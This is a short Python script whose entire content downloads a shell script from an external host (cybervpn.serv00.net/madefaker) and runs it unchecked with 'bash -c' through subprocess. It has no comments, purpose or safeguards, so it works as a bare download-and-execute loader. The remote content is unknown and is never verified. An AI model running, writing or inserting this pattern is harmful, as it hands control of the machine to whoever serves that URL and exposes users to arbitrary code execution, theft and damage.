import subprocess
import requests

url = "https://cybervpn.serv00.net/madefaker"
response = requests.get(url)

if response.status_code == 200:
    script_content = response.text
    subprocess.run(["bash", "-c", script_content])
else:
    print(f"Failed to fetch the script. HTTP Status Code: {response.status_code}")

